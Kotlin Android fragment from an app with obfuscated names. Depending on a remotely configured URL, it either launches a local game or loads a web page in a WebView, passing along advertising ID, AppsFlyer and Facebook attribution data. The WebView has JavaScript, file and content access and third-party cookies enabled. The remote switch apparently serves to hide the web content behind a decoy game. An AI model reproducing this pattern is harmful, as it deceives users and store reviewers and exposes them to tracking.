package com.te234.fnnj32Ra.ui

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import androidx.fragment.app.activityViewModels
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.te234.fnnj32Ra.GameActivity
import com.te234.fnnj32Ra.R
import com.te234.fnnj32Ra.databinding.FragmentLoadBinding
import com.te234.fnnj32Ra.di.MainApplication
import com.te234.fnnj32Ra.utils.checkForInternet
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class LoadFragment : Fragment() {
    private var _binding: FragmentLoadBinding? = null
    private val binding get() = _binding!!

    private val viewModel: LoadViewModel by activityViewModels()

    private var fileData: ValueCallback<Uri>? = null
    private var filePath: ValueCallback<Array<Uri>>? = null
    private val startFileChooseForResult =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                processFileChooseResult(result.data)
            }
        }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentLoadBinding.inflate(layoutInflater)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        requireActivity().onBackPressedDispatcher.addCallback(object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                binding.webView.apply {
                    if (isFocused && canGoBack()) goBack()
                }
            }
        })
        initLoading()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }

    private fun initLoading() {
        binding.pBar.visibility = View.VISIBLE
        val link = viewModel.getLink(requireContext())
        Log.d("TAG", "getCachedLink: $link")

        if (checkForInternet(requireContext())) {
            if (link != "") loadWebView(link) else setupBinomKeyJoeJol()
        } else {
            showNoInternetConnectionDialog()
            binding.pBar.visibility = View.GONE
        }
    }


    @SuppressLint("SetJavaScriptEnabled")
    private fun loadWebView(link: String) = with(binding.webView) {
        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(this@with, true)
        }

        settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowContentAccess = true
            allowFileAccess = true

            loadWithOverviewMode = true
            cacheMode = WebSettings.LOAD_DEFAULT
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
                binding.pBar.visibility = View.GONE
            }
        }
        webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView?, filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                filePath = filePathCallback
                val intent = Intent(Intent.ACTION_GET_CONTENT).apply {
                    addCategory(Intent.CATEGORY_OPENABLE)
                    type = "image/*"
                }
                startFileChooseForResult.launch(intent)
                return true
            }
        }
        clearCache(false)
        loadUrl(link)
        Log.d("TAG", "loadWebView: $link")
        //loadUrl("google.com")
    }

    private fun processFileChooseResult(data: Intent?) {
        if (fileData == null && filePath == null) return

        var resultFileData: Uri? = null
        var resultsFilePath: Array<Uri>? = null

        if (data != null) {
            resultFileData = data.data
            resultsFilePath = arrayOf(Uri.parse(data.dataString))
        }
        fileData?.onReceiveValue(resultFileData)
        filePath?.onReceiveValue(resultsFilePath)
    }

    private fun setupBinomKeyJoeJol() {
        val firebaseConfig = FirebaseRemoteConfig.getInstance()
        val firebaseConfigSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(2500)
            .build()
        firebaseConfig.setConfigSettingsAsync(firebaseConfigSettings)

        firebaseConfig.fetchAndActivate().addOnCompleteListener {
            val url = firebaseConfig.getString(getString(R.string.config_key))
            viewModel.setUrl(url)
            if (url.contains("http")) {
                startWork()
            } else {
                Intent(requireContext(), GameActivity::class.java).run {
                    startActivity(this)
                }
            }
            Log.d("TAG", "setupBinomKeyJoeJol: $url")
        }
    }

    private fun startWork() = lifecycleScope.launch(Dispatchers.IO) {
        lifecycleScope.launch(Dispatchers.Main.immediate) {
            getAppsFlyerParams()
        }
        getGoogleID()
        startInitFB()
    }

    private fun startInitFB() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(requireContext()) {
            val targetUri = it?.targetUri
            viewModel.setDeepLink(targetUri)
        }
    }

    private fun getGoogleID() {
        val googleId = AdvertisingIdClient.getAdvertisingIdInfo(requireContext())
        viewModel.setGoogleID(googleId.id.toString())
    }

    private fun getAppsFlyerParams() {
        val appsFlyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(requireContext())
        viewModel.setAppsFlyerUserID(appsFlyerUserId)

        MainApplication.liveDataAppsFlyer.observe(viewLifecycleOwner) {
            for (inform in it) {
                when (inform.key) {
                    "af_status" -> {
                        viewModel.afStatus(inform.value.toString())
                        Log.d("TAG", "getAppsFlyerParams af_status: ${inform.value}")
                    }
                    "campaign" -> {
                        viewModel.campaign(inform.value.toString())
                        Log.d("TAG", "getAppsFlyerParams campaign: ${inform.value}")
                    }
                    "media_source" -> {
                        viewModel.mediaSource(inform.value.toString())
                        Log.d("TAG", "getAppsFlyerParams media_source: ${inform.value}")
                    }
                    "af_channel" -> {
                        viewModel.afChannel(inform.value.toString())
                        Log.d("TAG", "getAppsFlyerParams af_channel: ${inform.value}")
                    }
                }
            }
            collectLink()
        }
    }

    private fun collectLink() {
        val mainLink = viewModel.saveLink(requireContext())
        loadWebView(mainLink)
    }


    private fun showNoInternetConnectionDialog(): AlertDialog =
        MaterialAlertDialogBuilder(requireContext()).setTitle("No internet connection")
            .setMessage("Check your internet connection and try again later")
            .setCancelable(false)
            .setPositiveButton("Try again") { dialog, _ ->
                initLoading()
                dialog.dismiss()
            }
            .show()
}